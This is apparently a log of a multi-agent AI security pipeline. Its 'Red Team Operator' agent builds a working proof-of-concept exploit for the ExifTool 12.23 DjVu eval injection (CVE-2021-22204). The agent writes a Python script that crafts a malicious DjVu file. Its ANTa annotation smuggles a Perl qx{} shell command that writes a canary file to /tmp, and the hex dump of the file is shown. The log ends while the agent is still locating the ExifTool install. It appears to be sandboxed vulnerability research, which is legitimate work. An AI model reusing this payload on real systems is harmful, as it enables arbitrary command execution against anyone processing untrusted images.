- lib/Image/ExifTool/Writer.pl
  - + JXL routed to Jpeg2000 writer module
- Tag/HTML docs updated: MacOS doc typo fix; JUMBF tag names adjusted; Sony/Fuji/Panasonic/PhaseOne tag updates only
- tests (t/*.out) reflect JUMBF tag name changes and 12.24 version strings

Recommendations
- Upgrade to exiftool 12.24 or later wherever ExifTool is invoked, especially in automated pipelines and services.
- If immediate upgrade is not possible, block/avoid processing DjVu files and derivatives.
- Treat .config files passed to ExifTool (-config) as executable code; audit usage and prevent untrusted configs.
- Consider adding file-type allowlist in any automation invoking ExifTool.

Stored artifacts (shared memory)
- versions_map: Found versions; 12.23 marked vulnerable; 12.24 baseline
- diff_summary: Security-relevant changes, especially DjVu.pm eval removal
- vulnerable_functions: Specific code location and indicator
- vulnerable_entrypoints: CLI parsing of DjVu; test commands

If you need a DjVu PoC for validation, or to map the exploit chain in more detail, provide permission to create/import a test file and I will proceed.


================================================================================
Code Analyst execution completed
================================================================================
================================================================================
Starting Red Team Operator execution
Input: Task: Build and validate a working PoC exploit for the identified vulnerability in exiftool-12.23 (DjVu ANT eval injection, CVE-2021-22204).

Context from shared memory:
- versions_map, diff_summary, vulnerable_functions, vulnerable_entrypoints are available. Vulnerability is in exiftool-12.23/lib/Image/ExifTool/DjVu.pm where quoted token strings from DjVu ANT annotations are processed via eval qq{"$tok"} after insufficient escaping.
- Entry point: run `perl exiftool-12.23/exiftool <file.djvu>` in sandbox.

Objective:
1) Verify version prints as expected.
2) Create a minimal, valid DjVu file with an ANTa (annotation) chunk that contains a malicious quoted token that breaks out and executes a command when evaluated. On success, create a canary file `/tmp/exiftool_pwned` containing the string `pwned`.
3) Demonstrate that exiftool-12.23 executes the payload, while exiftool-12.24 does not.

Guidance and payload structure:
- DjVu file format is IFF-like:
  - Top-level: b"FORM" + u32_be(length) + b"DJVU" + child chunks.
  - Child chunks: 4-byte type + u32_be(length) + data.
  - Annotations chunk type for ASCII text is b"ANTa". Data is plain text using DjVu s-expression syntax (e.g., (metadata "string" ...)).
- The vulnerable code evals contents of quoted strings in ANT parser to decode C escape sequences. We can craft a quoted token that, when wrapped by eval qq{"$tok"}, results in code execution using Perl operators. A reliable construct is to inject concatenation with qx{} backticks between two string parts. Example intended token value before eval: \" . qx{sh -c 'printf pwned > /tmp/exiftool_pwned'} . \". After eval, this will execute qx{...}.
- To embed this, we place the following as the quoted token content in the ANTa s-expression (the parser handles s-exprs and will visit quoted tokens):
  "\" . qx{sh -c 'printf pwned > /tmp/exiftool_pwned'} . \""
  Important: In the DjVu file, the outer quotes delimit the token; inside we escape the internal quotes with backslashes so the tokenizer keeps it one token. The vulnerable pre-processing doesn't neutralize `.` or `qx{}` operators, so eval executes them.

Plan:
- Implement a Python3 script (djvu_poc.py) that builds a minimal DjVu file with an ANTa chunk embedding:
  (metadata "\" . qx{sh -c 'printf pwned > /tmp/exiftool_pwned'} . \"")
- Compute correct IFF chunk sizes (big-endian 32-bit).
- Write to malicious.djvu.
- Run:
  - `perl exiftool-12.23/exiftool -ver`
  - `perl exiftool-12.23/exiftool malicious.djvu`
  - `ls -l /tmp/exiftool_pwned && echo OK-12.23 || echo FAIL-12.23`
  - `perl exiftool-12.24/exiftool malicious.djvu` (should not execute; file should already exist from previous run, but no new file write should occur)

If ANTa requires specific s-expr like (annotation ...) or (metadata (key "value")), use a minimal valid form such as:
  (metadata (Copyright "\" . qx{sh -c 'printf pwned > /tmp/exiftool_pwned'} . \"") )

Deliverables:
- The Python script content (saved in sandbox).
- The malicious DjVu file.
- Terminal output showing successful file creation on 12.23 and no execution on 12.24.
- If parsing errors occur, iterate by adjusting s-expression wrapper (e.g., switch to (annotation ...), (maparea ...), or ensure ANTa chunk is used rather than compressed ANTZ). Provide any error messages and request guidance if needed.

Execute now and report results. If required tools like Python are missing, implement in Perl instead. Ensure to check shared memory before starting and update with keys: poc_script, poc_path, exploit_result with concise status, without overwriting others.
================================================================================

[1]=========================Tool Call (Red Team Operator)==========================
list_shared_memory()

[1]========================Tool Output (Red Team Operator)=========================
Shared memory contents (current time: 00:09:37):
  -[00:02:37] versions_map:
Found versions in /codebase: exiftool-12.23, exiftool-12.24. By rule, the lowest... (truncated)
--------------------------------------------------------------------------------
  -[00:04:04] diff_summary:
Key security-relevant diff exiftool-12.23 -> 12.24:
- lib/Image/ExifTool/DjVu.pm... (truncated)
--------------------------------------------------------------------------------
  -[00:04:14] vulnerable_functions:
File: lib/Image/ExifTool/DjVu.pm (v1.06 in 12.23)
Function: ProcessAnt/ParseAnt ... (truncated)
--------------------------------------------------------------------------------
  -[00:04:24] vulnerable_entrypoints:
Primary attack surface: CLI tool `exiftool` reading untrusted files.
- File pars... (truncated)
--------------------------------------------------------------------------------

[2]=========================Tool Call (Red Team Operator)==========================
setup_sandbox()

[2]========================Tool Output (Red Team Operator)=========================
Sandbox setup successfully
Username: "user" Password: "passwd"
Rootuser: "root Password: "passwd" (Only use for setup purposes)
user
/home/user
total 20
drwxr-xr-x 2 user user 4096 Jul 25 21:46 .
drwxr-xr-x 1 root root 4096 Jul 25 21:46 ..
-rw-r--r-- 1 user user  220 Apr 18 22:47 .bash_logout
-rw-r--r-- 1 user user 3526 Apr 18 22:47 .bashrc
-rw-r--r-- 1 user user  807 Apr 18 22:47 .profile


[3]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input='ls -la /codebase', user='user', session=None, timeout=60)

[3]========================Tool Output (Red Team Operator)=========================
ls: cannot access '/codebase': No such file or directory


[4]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input="set -e\nsudo apt-get update -qq\nsudo apt-get install -y -qq wget python3 python3-venv perl\nwget -q https://exiftool.org/Image-ExifTool-12.23.tar.gz -O /home/user/Image-ExifTool-12.23.tar.gz\nwget -q https://exiftool.org/Image-ExifTool-12.24.tar.gz -O /home/user/Image-ExifTool-12.24.tar.gz\ntar -xzf Image-ExifTool-12.23.tar.gz\ntar -xzf Image-ExifTool-12.24.tar.gz\nls -la | sed -n '1,200p'\nperl Image-ExifTool-12.23/exiftool -ver\nperl Image-ExifTool-12.24/exiftool -ver", user='user', session=None, timeout=120)

[4]========================Tool Output (Red Team Operator)=========================
sh: 2: sudo: not found


[5]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input="set -e\napt-get update -qq\napt-get install -y -qq wget python3 python3-venv perl\nwget -q https://exiftool.org/Image-ExifTool-12.23.tar.gz -O /home/user/Image-ExifTool-12.23.tar.gz\nwget -q https://exiftool.org/Image-ExifTool-12.24.tar.gz -O /home/user/Image-ExifTool-12.24.tar.gz\ntar -xzf Image-ExifTool-12.23.tar.gz\ntar -xzf Image-ExifTool-12.24.tar.gz\nls -la | sed -n '1,200p'\nperl Image-ExifTool-12.23/exiftool -ver\nperl Image-ExifTool-12.24/exiftool -ver", user='root', session=None, timeout=120)

[5]========================Tool Output (Red Team Operator)=========================
debconf: delaying package configuration, since apt-utils is not installed
Selecting previously unselected package python3-lib2to3.
(Reading database ... (Reading database ... 5%(Reading database ... 10%(Reading database ... 15%(Reading database ... 20%(Reading database ... 25%(Reading database ... 30%(Reading database ... 35%(Reading database ... 40%(Reading database ... 45%(Reading database ... 50%(Reading database ... 55%(Reading database ... 60%(Reading database ... 65%(Reading database ... 70%(Reading database ... 75%(Reading database ... 80%(Reading database ... 85%(Reading database ... 90%(Reading database ... 95%(Reading database ... 100%(Reading database ... 25713 files and directories currently installed.)
Preparing to unpack .../0-python3-lib2to3_3.11.2-3_all.deb ...
Unpacking python3-lib2to3 (3.11.2-3) ...
Selecting previously unselected package python3-distutils.
Preparing to unpack .../1-python3-distutils_3.11.2-3_all.deb ...
Unpacking python3-distutils (3.11.2-3) ...
Selecting previously unselected package python3-pip-whl.
Preparing to unpack .../2-python3-pip-whl_23.0.1+dfsg-1_all.deb ...
Unpacking python3-pip-whl (23.0.1+dfsg-1) ...
Selecting previously unselected package python3-setuptools-whl.
Preparing to unpack .../3-python3-setuptools-whl_66.1.1-1+deb12u1_all.deb ...
Unpacking python3-setuptools-whl (66.1.1-1+deb12u1) ...
Selecting previously unselected package python3.11-venv.
Preparing to unpack .../4-python3.11-venv_3.11.2-6+deb12u6_amd64.deb ...
Unpacking python3.11-venv (3.11.2-6+deb12u6) ...
Selecting previously unselected package python3-venv.
Preparing to unpack .../5-python3-venv_3.11.2-1+b1_amd64.deb ...
Unpacking python3-venv (3.11.2-1+b1) ...
Setting up python3-setuptools-whl (66.1.1-1+deb12u1) ...
Setting up python3-pip-whl (23.0.1+dfsg-1) ...
Setting up python3-lib2to3 (3.11.2-3) ...
Setting up python3-distutils (3.11.2-3) ...
Setting up python3.11-venv (3.11.2-6+deb12u6) ...
Setting up python3-venv (3.11.2-1+b1) ...


[6]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input="set -e\napt-get update -qq\napt-get install -y -qq wget perl\nwget -q https://exiftool.org/Image-ExifTool-12.23.tar.gz -O /home/user/Image-ExifTool-12.23.tar.gz\nwget -q https://exiftool.org/Image-ExifTool-12.24.tar.gz -O /home/user/Image-ExifTool-12.24.tar.gz\ntar -xzf Image-ExifTool-12.23.tar.gz\ntar -xzf Image-ExifTool-12.24.tar.gz\nls -la | sed -n '1,200p'\nperl Image-ExifTool-12.23/exiftool -ver\nperl Image-ExifTool-12.24/exiftool -ver", user='root', session=None, timeout=120)

[6]========================Tool Output (Red Team Operator)=========================


[7]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input="ls -la | sed -n '1,200p'\nperl Image-ExifTool-12.23/exiftool -ver || true\nperl Image-ExifTool-12.24/exiftool -ver || true", user='user', session=None, timeout=60)

[7]========================Tool Output (Red Team Operator)=========================
total 24
drwxr-xr-x 1 user user 4096 Aug  7 22:10 .
drwxr-xr-x 1 root root 4096 Jul 25 21:46 ..
-rw-r--r-- 1 user user  220 Apr 18 22:47 .bash_logout
-rw-r--r-- 1 user user 3526 Apr 18 22:47 .bashrc
-rw-r--r-- 1 user user  807 Apr 18 22:47 .profile
-rw-r--r-- 1 root root    0 Aug  7 22:11 Image-ExifTool-12.23.tar.gz
Can't open perl script "Image-ExifTool-12.23/exiftool": No such file or directory
Can't open perl script "Image-ExifTool-12.24/exiftool": No such file or directory


[8]=========================Tool Call (Red Team Operator)==========================
sandbox_write_file(file_path='/home/user/djvu_poc.py', content='#!/usr/bin/env python3\nimport struct\nfrom pathlib import Path\n\ndef be32(n):\n    return struct.pack(\'>I\', n)\n\n# Malicious ANTa s-expression with injected quoted token\n# The token content includes escaped quotes to break out when eval qq{"$tok"} runs in 12.23\npayload = \'(metadata "\\\\" . qx{sh -c \'\\\'\'printf pwned > /tmp/exiftool_pwned\'\\\'\'} . \\\\\\" )\\n\'\n# Note: The above includes a trailing space before the closing escaped quote to avoid tokenizer edge cases\n# and a trailing newline to be safe.\n\nanta_data = payload.encode(\'ascii\')\nanta_chunk = b\'ANTa\' + be32(len(anta_data)) + anta_data\n\n# Build top-level DjVu IFF: AT&TFORM + size + DJVU + child chunks\n# size field is the size of the remaining file after this field: len(\'DJVU\'+children)\nchildren = anta_chunk\nform_type = b\'DJVU\'\nsize = len(form_type) + len(children)\n\ndjvu = b\'AT&TFORM\' + be32(size) + form_type + children\n\nout = Path(\'malicious.djvu\')\nout.write_bytes(djvu)\nprint(f\'[+] Wrote {out} ({len(djvu)} bytes)\')\n')

[8]========================Tool Output (Red Team Operator)=========================
File /home/user/djvu_poc.py created successfully.

[9]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input="python3 /home/user/djvu_poc.py\nxxd -g 1 -l 128 malicious.djvu | sed -n '1,50p'\nfile malicious.djvu || true", user='user', session=None, timeout=60)

[9]========================Tool Output (Red Team Operator)=========================
  File "/home/user/djvu_poc.py", line 10
    payload = '(metadata "\\" . qx{sh -c '\''printf pwned > /tmp/exiftool_pwned'\''} . \\\" )\n'
                                           ^
SyntaxError: unexpected character after line continuation character
xxd: malicious.djvu: No such file or directory
sh: 3: file: not found


[10]=========================Tool Call (Red Team Operator)==========================
sandbox_write_file(file_path='/home/user/djvu_poc.py', content='#!/usr/bin/env python3\nimport struct\nfrom pathlib import Path\n\ndef be32(n):\n    return struct.pack(\'>I\', n)\n\n# Build the injected token and ANTa s-expression\n# Token content that will be evaluated in 12.23 DjVu.pm via eval qq{"$tok"}\n# It leverages concatenation with qx{} to execute a shell command.\ninj_tok = "\\\\\\" . qx{sh -c \'printf pwned > /tmp/exiftool_pwned\'} . \\\\\\""\npayload = f\'(metadata "{inj_tok}")\\n\'\n\nanta_data = payload.encode(\'ascii\')\nanta_chunk = b\'ANTa\' + be32(len(anta_data)) + anta_data\n\n# Build top-level DjVu IFF: FORM + size + DJVU + child chunks\nchildren = anta_chunk\nform_type = b\'DJVU\'\nsize = len(form_type) + len(children)\n\ndjvu = b\'FORM\' + be32(size) + form_type + children\n\nout = Path(\'malicious.djvu\')\nout.write_bytes(djvu)\nprint(f\'[+] Wrote {out} ({len(djvu)} bytes)\')\nprint(\'[+] Payload s-expression:\')\nprint(payload)\n')

[10]========================Tool Output (Red Team Operator)=========================
File /home/user/djvu_poc.py created successfully.

[11]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input='python3 /home/user/djvu_poc.py\nxxd -g 1 -l 160 malicious.djvu | sed -n \'1,50p\'\npython3 - <<\'PY\'\nprint("Check Python string escaping looks right:")\ninj_tok = "\\\\\\" . qx{sh -c \'printf pwned > /tmp/exiftool_pwned\'} . \\\\\\""\nprint(inj_tok)\nPY', user='user', session=None, timeout=60)

[11]========================Tool Output (Red Team Operator)=========================
[+] Wrote malicious.djvu (90 bytes)
[+] Payload s-expression:
(metadata "\" . qx{sh -c 'printf pwned > /tmp/exiftool_pwned'} . \"")

00000000: 46 4f 52 4d 00 00 00 52 44 4a 56 55 41 4e 54 61  FORM...RDJVUANTa
00000010: 00 00 00 46 28 6d 65 74 61 64 61 74 61 20 22 5c  ...F(metadata "\
00000020: 22 20 2e 20 71 78 7b 73 68 20 2d 63 20 27 70 72  " . qx{sh -c 'pr
00000030: 69 6e 74 66 20 70 77 6e 65 64 20 3e 20 2f 74 6d  intf pwned > /tm
00000040: 70 2f 65 78 69 66 74 6f 6f 6c 5f 70 77 6e 65 64  p/exiftool_pwned
00000050: 27 7d 20 2e 20 5c 22 22 29 0a                    '} . \"").
Check Python string escaping looks right:
\" . qx{sh -c 'printf pwned > /tmp/exiftool_pwned'} . \"


[12]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input="set -e\n# Fetch exiftool releases again (previous attempt failed to unpack?)\n[ -d Image-ExifTool-12.23 ] || wget -q https://exiftool.org/Image-ExifTool-12.23.tar.gz -O Image-ExifTool-12.23.tar.gz\n[ -d Image-ExifTool-12.24 ] || wget -q https://exiftool.org/Image-ExifTool-12.24.tar.gz -O Image-ExifTool-12.24.tar.gz\n[ -d Image-ExifTool-12.23 ] || tar -xzf Image-ExifTool-12.23.tar.gz\n[ -d Image-ExifTool-12.24 ] || tar -xzf Image-ExifTool-12.24.tar.gz\nls -la | sed -n '1,200p'\nperl Image-ExifTool-12.23/exiftool -ver\nperl Image-ExifTool-12.24/exiftool -ver", user='user', session=None, timeout=120)

[12]========================Tool Output (Red Team Operator)=========================
Image-ExifTool-12.23.tar.gz: Permission denied


[13]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input="set -e\ncd /home/user\nrm -f Image-ExifTool-12.23.tar.gz Image-ExifTool-12.24.tar.gz || true\nwget -q https://exiftool.org/Image-ExifTool-12.23.tar.gz -O Image-ExifTool-12.23.tar.gz\nwget -q https://exiftool.org/Image-ExifTool-12.24.tar.gz -O Image-ExifTool-12.24.tar.gz\ntar -xzf Image-ExifTool-12.23.tar.gz\ntar -xzf Image-ExifTool-12.24.tar.gz\nls -la | sed -n '1,200p'\nperl Image-ExifTool-12.23/exiftool -ver\nperl Image-ExifTool-12.24/exiftool -ver", user='root', session=None, timeout=120)

[13]========================Tool Output (Red Team Operator)=========================


[14]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input="ls -la | sed -n '1,200p'\nperl Image-ExifTool-12.23/exiftool -ver || true\nperl Image-ExifTool-12.24/exiftool -ver || true", user='user', session=None, timeout=120)

[14]========================Tool Output (Red Team Operator)=========================
total 32
drwxr-xr-x 1 user user 4096 Aug  7 22:13 .
drwxr-xr-x 1 root root 4096 Jul 25 21:46 ..
-rw-r--r-- 1 user user  220 Apr 18 22:47 .bash_logout
-rw-r--r-- 1 user user 3526 Apr 18 22:47 .bashrc
-rw-r--r-- 1 user user  807 Apr 18 22:47 .profile
-rw-r--r-- 1 root root    0 Aug  7 22:13 Image-ExifTool-12.23.tar.gz
-rw-r--r-- 1 root root  848 Jan  1  1970 djvu_poc.py
-rw-r--r-- 1 user user   90 Aug  7 22:13 malicious.djvu
Can't open perl script "Image-ExifTool-12.23/exiftool": No such file or directory
Can't open perl script "Image-ExifTool-12.24/exiftool": No such file or directory


[15]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input="set -e\nfind / -maxdepth 3 -type d -name 'exiftool-12.*' 2>/dev/null | sed -n '1,200p'\nfind / -maxdepth 3 -type d -name 'Image-ExifTool-12.*' 2>/dev/null | sed -n '1,200p'\nls -la /\nls -la /codebase || true", user='root', session=None, timeout=120)

[15]========================Tool Output (Red Team Operator)=========================
/exiftool-12.23
total 5960
drwxr-xr-x   1 root root    4096 Aug  7 22:13 .
drwxr-xr-x   1 root root    4096 Aug  7 22:13 ..
-rwxr-xr-x   1 root root       0 Aug  7 22:09 .dockerenv
-rw-r--r--   1 root root 6023392 Jul 25 21:46 12.23.zip
lrwxrwxrwx   1 root root       7 Jul 21 00:00 bin -> usr/bin
drwxr-xr-x   2 root root    4096 May  9 14:50 boot
drwxr-xr-x   5 root root     340 Aug  7 22:09 dev
drwxr-xr-x   1 root root    4096 Aug  7 22:09 etc
drwxr-xr-x   9 root root    4096 Jul 25 21:46 exiftool-12.23
drwxr-xr-x   1 root root    4096 Jul 25 21:46 home
lrwxrwxrwx   1 root root       7 Jul 21 00:00 lib -> usr/lib
lrwxrwxrwx   1 root root       9 Jul 21 00:00 lib64 -> usr/lib64
drwxr-xr-x   2 root root    4096 Jul 21 00:00 media
drwxr-xr-x   2 root root    4096 Jul 21 00:00 mnt
drwxr-xr-x   2 root root    4096 Jul 21 00:00 opt
dr-xr-xr-x 482 root root       0 Aug  7 22:09 proc
drwx------   1 root root    4096 Jul 25 21:46 root
drwxr-xr-x   1 root root    4096 Jul 25 21:46 run
lrwxrwxrwx   1 root root       8 Jul 21 00:00 sbin -> usr/sbin
drwxr-xr-x   2 root root    4096 Jul 21 00:00 srv
dr-xr-xr-x  13 root root       0 Aug  7 22:09 sys
drwxrwxrwt   1 root root    4096 Aug  7 22:11 tmp
drwxr-xr-x   1 root root    4096 Jul 21 00:00 usr
drwxr-xr-x   1 root root    4096 Jul 21 00:00 var
ls: cannot access '/codebase': No such file or directory


[16]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input="ls -la /exiftool-12.23 | sed -n '1,200p'\nls -la /exiftool-12.23/lib/Image/ExifTool | sed -n '1,200p'\nperl /exiftool-12.23/exiftool -ver || true", user='user', session=None, timeout=120)

[16]========================Tool Output (Red Team Operator)=========================
total 1276
drwxr-xr-x 9 root root   4096 Jul 25 21:46 .
drwxr-xr-x 1 root root   4096 Aug  7 22:13 ..
-rw-r--r-- 1 root root 449496 Apr  1  2021 Changes
-rw-r--r-- 1 root root  22011 Apr  1  2021 MANIFEST
-rw-r--r-- 1 root root   1360 Apr  1  2021 META.json
-rw-r--r-- 1 root root    812 Apr  1  2021 META.yml
-rw-r--r-- 1 root root   1358 Jul 25 21:46 MYMETA.json
-rw-r--r-- 1 root root    847 Jul 25 21:46 MYMETA.yml
-rw-r--r-- 1 root root  81779 Jul 25 21:46 Makefile
-rw-r--r-- 1 root root   2018 Apr  1  2021 Makefile.PL
-rw-r--r-- 1 root root  12622 Apr  1  2021 README
drwxr-xr-x 2 root root   4096 Apr  1  2021 arg_files
drwxr-xr-x 8 root root   4096 Jul 25 21:46 blib
-rwxr-xr-x 1 root root   1943 Apr  1  2021 build_tag_lookup
drwxr-xr-x 2 root root   4096 Apr  1  2021 config_files
-rwxr-xr-x 1 root root 307194 Apr  1  2021 exiftool
drwxr-xr-x 2 root root   4096 Apr  1  2021 fmt_files
drwxr-xr-x 3 root root   4096 Apr  1  2021 html
drwxr-xr-x 4 root root   4096 Apr  1  2021 lib
-rw-r--r-- 1 root root   5677 Apr  1  2021 perl-Image-ExifTool.spec
-rw-r--r-- 1 root root      0 Jul 25 21:46 pm_to_blib
-rw-r--r-- 1 root root   8169 Apr  1  2021 pp_build_exe.args
drwxr-xr-x 3 root root  20480 Jul 25 21:46 t
-rwxr-xr-x 1 root root   4249 Apr  1  2021 validate
-rwxr-xr-x 1 root root 320233 Apr  1  2021 windows_exiftool
total 10560
drwxr-xr-x 4 root root    4096 Apr  1  2021 .
drwxr-xr-x 3 root root    4096 Apr  1  2021 ..
-rw-r--r-- 1 root root   19103 Apr  1  2021 AES.pm
-rw-r--r-- 1 root root   10633 Apr  1  2021 AFCP.pm
-rw-r--r-- 1 root root    9817 Apr  1  2021 AIFF.pm
-rw-r--r-- 1 root root    9275 Apr  1  2021 APE.pm
-rw-r--r-- 1 root root   10692 Apr  1  2021 APP12.pm
-rw-r--r-- 1 root root   30938 Apr  1  2021 ASF.pm
-rw-r--r-- 1 root root    5563 Apr  1  2021 Apple.pm
-rw-r--r-- 1 root root   11795 Apr  1  2021 Audible.pm
-rw-r--r-- 1 root root   10702 Apr  1  2021 BMP.pm
-rw-r--r-- 1 root root    7715 Apr  1  2021 BPG.pm
-rw-r--r-- 1 root root   17876 Apr  1  2021 BZZ.pm
-rw-r--r-- 1 root root   11541 Apr  1  2021 BigTIFF.pm
-rw-r--r-- 1 root root  124040 Apr  1  2021 BuildTagLookup.pm
-rw-r--r-- 1 root root  373945 Apr  1  2021 Canon.pm
-rw-r--r-- 1 root root   86033 Apr  1  2021 CanonCustom.pm
-rw-r--r-- 1 root root   30392 Apr  1  2021 CanonRaw.pm
-rw-r--r-- 1 root root   77008 Apr  1  2021 CanonVRD.pm
-rw-r--r-- 1 root root    8039 Apr  1  2021 CaptureOne.pm
-rw-r--r-- 1 root root   63705 Apr  1  2021 Casio.pm
drwxr-xr-x 2 root root    4096 Apr  1  2021 Charset
-rw-r--r-- 1 root root   16318 Apr  1  2021 Charset.pm
-rw-r--r-- 1 root root  250974 Apr  1  2021 DICOM.pm
-rw-r--r-- 1 root root    6464 Apr  1  2021 DJI.pm
-rw-r--r-- 1 root root   32344 Apr  1  2021 DNG.pm
-rw-r--r-- 1 root root    9360 Apr  1  2021 DPX.pm
-rw-r--r-- 1 root root    9985 Apr  1  2021 DV.pm
-rw-r--r-- 1 root root   15736 Apr  1  2021 DarwinCore.pm
-rw-r--r-- 1 root root   12692 Apr  1  2021 DjVu.pm
-rw-r--r-- 1 root root   51510 Apr  1  2021 EXE.pm
-rw-r--r-- 1 root root  247232 Apr  1  2021 Exif.pm
-rw-r--r-- 1 root root    5863 Apr  1  2021 FITS.pm
-rw-r--r-- 1 root root   10129 Apr  1  2021 FLAC.pm
-rw-r--r-- 1 root root   11928 Apr  1  2021 FLIF.pm
-rw-r--r-- 1 root root   59554 Apr  1  2021 FLIR.pm
-rw-r--r-- 1 root root   12730 Apr  1  2021 Fixup.pm
-rw-r--r-- 1 root root   28161 Apr  1  2021 Flash.pm
-rw-r--r-- 1 root root   88464 Apr  1  2021 FlashPix.pm
-rw-r--r-- 1 root root   28000 Apr  1  2021 Font.pm
-rw-r--r-- 1 root root    8162 Apr  1  2021 FotoStation.pm
-rw-r--r-- 1 root root   55384 Apr  1  2021 FujiFilm.pm
-rw-r--r-- 1 root root    2046 Apr  1  2021 GE.pm
-rw-r--r-- 1 root root   22176 Apr  1  2021 GIF.pm
-rw-r--r-- 1 root root    8550 Apr  1  2021 GIMP.pm
-rw-r--r-- 1 root root   19626 Apr  1  2021 GPS.pm
-rw-r--r-- 1 root root   89614 Apr  1  2021 GeoTiff.pm
-rw-r--r-- 1 root root   63757 Apr  1  2021 Geotag.pm
-rw-r--r-- 1 root root   28230 Apr  1  2021 GoPro.pm
-rw-r--r-- 1 root root   40235 Apr  1  2021 H264.pm
-rw-r--r-- 1 root root    8197 Apr  1  2021 HP.pm
-rw-r--r-- 1 root root   22634 Apr  1  2021 HTML.pm
-rw-r--r-- 1 root root   33584 Apr  1  2021 HtmlDump.pm
-rw-r--r-- 1 root root   43941 Apr  1  2021 ICC_Profile.pm
-rw-r--r-- 1 root root   57801 Apr  1  2021 ID3.pm
-rw-r--r-- 1 root root   40487 Apr  1  2021 IPTC.pm
-rw-r--r-- 1 root root    6970 Apr  1  2021 ISO.pm
-rw-r--r-- 1 root root    6792 Apr  1  2021 ITC.pm
-rw-r--r-- 1 root root   13142 Apr  1  2021 Import.pm
-rw-r--r-- 1 root root   10654 Apr  1  2021 InDesign.pm
-rw-r--r-- 1 root root   22666 Apr  1  2021 JPEG.pm
-rw-r--r-- 1 root root  217476 Apr  1  2021 JPEGDigest.pm
-rw-r--r-- 1 root root    6059 Apr  1  2021 JSON.pm
-rw-r--r-- 1 root root    3660 Apr  1  2021 JVC.pm
-rw-r--r-- 1 root root   43868 Apr  1  2021 Jpeg2000.pm
-rw-r--r-- 1 root root  123357 Apr  1  2021 Kodak.pm
-rw-r--r-- 1 root root    4411 Apr  1  2021 KyoceraRaw.pm
-rw-r--r-- 1 root root   22547 Apr  1  2021 LNK.pm
drwxr-xr-x 2 root root    4096 Apr  1  2021 Lang
-rw-r--r-- 1 root root   16737 Apr  1  2021 Leaf.pm
-rw-r--r-- 1 root root    7741 Apr  1  2021 Lytro.pm
-rw-r--r-- 1 root root   32950 Apr  1  2021 M2TS.pm
-rw-r--r-- 1 root root  104440 Apr  1  2021 MIE.pm
-rw-r--r-- 1 root root   14004 Apr  1  2021 MIEUnits.pod
-rw-r--r-- 1 root root    9263 Apr  1  2021 MIFF.pm
-rw-r--r-- 1 root root   16606 Apr  1  2021 MNG.pm
-rw-r--r-- 1 root root    4241 Apr  1  2021 MOI.pm
-rw-r--r-- 1 root root    4152 Apr  1  2021 MPC.pm
-rw-r--r-- 1 root root   22860 Apr  1  2021 MPEG.pm
-rw-r--r-- 1 root root    9158 Apr  1  2021 MPF.pm
-rw-r--r-- 1 root root   31376 Apr  1  2021 MWG.pm
-rw-r--r-- 1 root root  258709 Apr  1  2021 MXF.pm
-rw-r--r-- 1 root root   31434 Apr  1  2021 MacOS.pm
-rw-r--r-- 1 root root   70580 Apr  1  2021 MakerNotes.pm
-rw-r--r-- 1 root root   35117 Apr  1  2021 Matroska.pm
-rw-r--r-- 1 root root   53244 Apr  1  2021 Microsoft.pm
-rw-r--r-- 1 root root  102330 Apr  1  2021 Minolta.pm
-rw-r--r-- 1 root root   16883 Apr  1  2021 MinoltaRaw.pm
-rw-r--r-- 1 root root    5440 Apr  1  2021 Motorola.pm
-rw-r--r-- 1 root root  375595 Apr  1  2021 Nikon.pm
-rw-r--r-- 1 root root   28807 Apr  1  2021 NikonCapture.pm
-rw-r--r-- 1 root root  272682 Apr  1  2021 NikonCustom.pm
-rw-r--r-- 1 root root   71019 Apr  1  2021 NikonSettings.pm
-rw-r--r-- 1 root root    3322 Apr  1  2021 Nintendo.pm
-rw-r--r-- 1 root root   13941 Apr  1  2021 OOXML.pm
-rw-r--r-- 1 root root    9020 Apr  1  2021 Ogg.pm
-rw-r--r-- 1 root root  142859 Apr  1  2021 Olympus.pm
-rw-r--r-- 1 root root   10366 Apr  1  2021 OpenEXR.pm
-rw-r--r-- 1 root root    2270 Apr  1  2021 Opus.pm
-rw-r--r-- 1 root root    3810 Apr  1  2021 PCX.pm
-rw-r--r-- 1 root root   92826 Apr  1  2021 PDF.pm
-rw-r--r-- 1 root root    4135 Apr  1  2021 PGF.pm
-rw-r--r-- 1 root root   33998 Apr  1  2021 PICT.pm
-rw-r--r-- 1 root root   17481 Apr  1  2021 PLIST.pm
-rw-r--r-- 1 root root  151251 Apr  1  2021 PLUS.pm
-rw-r--r-- 1 root root   61166 Apr  1  2021 PNG.pm
-rw-r--r-- 1 root root    5087 Apr  1  2021 PPM.pm
-rw-r--r-- 1 root root    9235 Apr  1  2021 PSP.pm
-rw-r--r-- 1 root root   12184 Apr  1  2021 Palm.pm
-rw-r--r-- 1 root root   98143 Apr  1  2021 Panasonic.pm
-rw-r--r-- 1 root root   32533 Apr  1  2021 PanasonicRaw.pm
-rw-r--r-- 1 root root   21457 Apr  1  2021 Parrot.pm
-rw-r--r-- 1 root root  225049 Apr  1  2021 Pentax.pm
-rw-r--r-- 1 root root   26718 Apr  1  2021 PhaseOne.pm
-rw-r--r-- 1 root root   18688 Apr  1  2021 PhotoCD.pm
-rw-r--r-- 1 root root    8283 Apr  1  2021 PhotoMechanic.pm
-rw-r--r-- 1 root root   44132 Apr  1  2021 Photoshop.pm
-rw-r--r-- 1 root root   29813 Apr  1  2021 PostScript.pm
-rw-r--r-- 1 root root    3521 Apr  1  2021 PrintIM.pm
-rw-r--r-- 1 root root   44472 Apr  1  2021 Qualcomm.pm
-rw-r--r-- 1 root root  413470 Apr  1  2021 QuickTime.pm
-rw-r--r-- 1 root root  119762 Apr  1  2021 QuickTimeStream.pl
-rw-r--r-- 1 root root   66483 Apr  1  2021 README
-rw-r--r-- 1 root root   70022 Apr  1  2021 RIFF.pm
-rw-r--r-- 1 root root    9813 Apr  1  2021 RSRC.pm
-rw-r--r-- 1 root root   13780 Apr  1  2021 RTF.pm
-rw-r--r-- 1 root root    4665 Apr  1  2021 Radiance.pm
-rw-r--r-- 1 root root    6323 Apr  1  2021 Rawzor.pm
